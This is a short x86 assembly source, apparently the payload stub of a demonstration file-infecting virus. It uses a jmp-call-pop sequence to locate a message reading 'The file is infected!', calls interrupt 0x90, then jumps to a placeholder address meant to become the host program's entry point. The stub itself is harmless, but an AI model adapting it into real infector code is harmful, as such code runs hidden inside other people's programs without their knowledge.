global _start
section .text

_start:	
	pushad
	jmp tmp

main:
	pop edx
	xor eax, eax
	int 0x90
	popad
	mov ebx, 0x00000000
	jmp ebx

tmp:
	call main

msg:
	db "The file is infected! ^_^ ^_^", 0xA, 0x0
